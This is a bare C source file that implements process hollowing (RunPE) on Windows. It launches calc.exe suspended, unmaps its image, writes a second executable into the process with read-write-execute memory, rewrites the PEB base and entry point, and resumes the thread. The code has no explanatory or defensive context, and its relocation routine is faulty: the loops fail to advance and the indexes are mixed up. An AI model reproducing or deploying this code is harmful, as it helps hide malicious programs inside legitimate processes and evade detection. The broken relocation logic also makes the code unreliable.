#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>
#define GUI 1

void ApplyRelocations(PIMAGE_NT_HEADERS nt_headers, LPVOID PE_content, LPVOID allocated_base, ULONGLONG prefer_base)
{
    nt_headers->OptionalHeader.ImageBase = (ULONGLONG)allocated_base;

    DWORD relocation_table_base_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

    PIMAGE_SECTION_HEADER header_section = IMAGE_FIRST_SECTION(nt_headers);
    DWORD relocation_table_base_offset;
    int index = 0;
    while(index < nt_headers->FileHeader.NumberOfSections)
    {
        if(relocation_table_base_rva >= header_section[index].VirtualAddress && relocation_table_base_rva < header_section[index].Misc.VirtualSize)
        {
            relocation_table_base_offset = header_section[index].PointerToRawData + relocation_table_base_rva - header_section[index].VirtualAddress;
            break;
        }
        index++;
    }

    LPVOID relocation_table_base = (LPVOID)((DWORD_PTR)PE_content + relocation_table_base_offset);
    DWORD relocation_table_size = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    index = 0;
    while(index < relocation_table_size)
    {
        IMAGE_BASE_RELOCATION* base_reloc_block = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)relocation_table_base + index);
        LPVOID block_entry = (LPVOID)((DWORD_PTR)base_reloc_block + sizeof(base_reloc_block->SizeOfBlock) + sizeof(base_reloc_block->VirtualAddress));

        DWORD number_of_blocks = (base_reloc_block->SizeOfBlock - sizeof(base_reloc_block->SizeOfBlock) - sizeof(base_reloc_block)) / sizeof(WORD);
        WORD* blocks = (WORD*)block_entry;

        for(int i = 0; i < number_of_blocks; i++)
        {
            WORD block_t = (blocks[i] & 0xf000) >> 0xc;
            WORD offset_block = blocks[i] & 0x0fff;

            if((block_t == IMAGE_REL_BASED_HIGHLOW) || (block_t == IMAGE_REL_BASED_DIR64))
            {
                DWORD rva_addr = base_reloc_block->VirtualAddress + (DWORD)offset_block;

                header_section = IMAGE_FIRST_SECTION(nt_headers);
                DWORD offset_rva_addr = 0;
                for(int j = 0; j < nt_headers->FileHeader.NumberOfSections; i++)
                {
                    if(rva_addr >= header_section[j].VirtualAddress && rva_addr < header_section[j].VirtualAddress + header_section[i].Misc.VirtualSize)
                    {
                        offset_rva_addr = header_section[i].PointerToRawData + rva_addr - header_section[i].VirtualAddress;
                        break;
                    }
                }
                ULONGLONG* fix_addr = (ULONGLONG*)((DWORD_PTR)PE_content + offset_rva_addr);
                *fix_addr -= prefer_base;
                *fix_addr += (ULONGLONG)allocated_base;
            }
        }
    }
}

LPVOID ReadPE(char* pe)
{
    HANDLE h_file = CreateFileA(pe, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	LARGE_INTEGER file_size;
	GetFileSizeEx(h_file, &file_size);

	LPVOID content = VirtualAlloc(NULL, file_size.QuadPart, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

	DWORD readed_bytes;
	ReadFile(h_file, content, file_size.QuadPart, &readed_bytes, NULL);
	CloseHandle(h_file);

    return content;
}

void RunPE(char* host_pe, char* inject_pe)
{
    STARTUPINFOA startup_proc_info;
	PROCESS_INFORMATION proc_info;

	ZeroMemory(&proc_info, sizeof(proc_info));

	ZeroMemory(&startup_proc_info, sizeof(startup_proc_info));

	startup_proc_info.cb = sizeof(startup_proc_info);

	CreateProcessA(host_pe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startup_proc_info, &proc_info);

    CONTEXT context;
    ZeroMemory(&context, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(proc_info.hThread, &context);
    LPVOID PEB = (LPVOID)(context.Rdx + 2 * sizeof(ULONGLONG));

    LPVOID PE_content = ReadPE(inject_pe);
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)PE_content;
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((LONG_PTR)PE_content + dos_header->e_lfanew);
    ULONGLONG prefer_base = nt_header->OptionalHeader.ImageBase;
    SIZE_T payload_size = nt_header->OptionalHeader.SizeOfImage;
    #if GUI
    nt_header->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
    #endif

    PVOID original_img_base;
    ReadProcessMemory(proc_info.hProcess, PEB, &original_img_base, sizeof(original_img_base), NULL);

    if(original_img_base == (LPVOID)prefer_base)
    {
        HMODULE h_ntdll = GetModuleHandleA("ntdll.dll");
        FARPROC NtUnmapViewOfSection = GetProcAddress(h_ntdll, "NtUnmapViewOfSection");

        if ((*(NTSTATUS(*)(HANDLE, PVOID)) NtUnmapViewOfSection)(
			proc_info.hProcess, original_img_base))
	{
            return;
	}
    }

    LPVOID allocated_base = VirtualAllocEx(proc_info.hProcess, (LPVOID)prefer_base, payload_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    payload_size = nt_header->OptionalHeader.SizeOfImage;

    if(original_img_base != allocated_base)
    {
        size_t written;
        WriteProcessMemory(proc_info.hProcess, PEB, &allocated_base, sizeof(allocated_base), &written);
    }

    if(allocated_base != (LPVOID)prefer_base)
    {
        if(!(nt_header->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED))
            ApplyRelocations(nt_header, PE_content, allocated_base, prefer_base);
    }

    size_t written;
    WriteProcessMemory(proc_info.hProcess, allocated_base, PE_content, nt_header->OptionalHeader.SizeOfHeaders, &written);

    DWORD old_protect;
    VirtualProtectEx(proc_info.hProcess, allocated_base, nt_header->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old_protect);

    IMAGE_SECTION_HEADER* section_header_arr = (IMAGE_SECTION_HEADER*)((ULONG_PTR)PE_content + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    for(int i = 0; i < nt_header->FileHeader.NumberOfSections; i++)
	{
        WriteProcessMemory(proc_info.hProcess, (LPVOID)((ULONGLONG)allocated_base + section_header_arr[i].VirtualAddress), (LPCVOID)((DWORD_PTR)PE_content + section_header_arr[i].PointerToRawData), section_header_arr[i].SizeOfRawData, &written);

        int section_mapped_sz = 0;
		if(i == nt_header->FileHeader.NumberOfSections - 1)
        {
			section_mapped_sz = nt_header->OptionalHeader.SizeOfImage - section_header_arr[i].VirtualAddress;
		}else
        {
			section_mapped_sz = section_header_arr[i + 1].VirtualAddress - section_header_arr[i].VirtualAddress;
		}

        DWORD section_protection = PAGE_EXECUTE_READWRITE;

        VirtualProtectEx(proc_info.hProcess, (LPVOID)((ULONGLONG)allocated_base + section_header_arr[i].VirtualAddress), section_mapped_sz, section_protection, &old_protect);
    }

    context.Rcx = (ULONGLONG)allocated_base + nt_header->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(proc_info.hThread, &context);
    ResumeThread(proc_info.hThread);

    CloseHandle(proc_info.hThread);
    CloseHandle(proc_info.hProcess);

}

int main()
{
    RunPE("C:\\windows\\system32\\calc.exe", "C:\\Users\\pe_to_inject.exe");
}
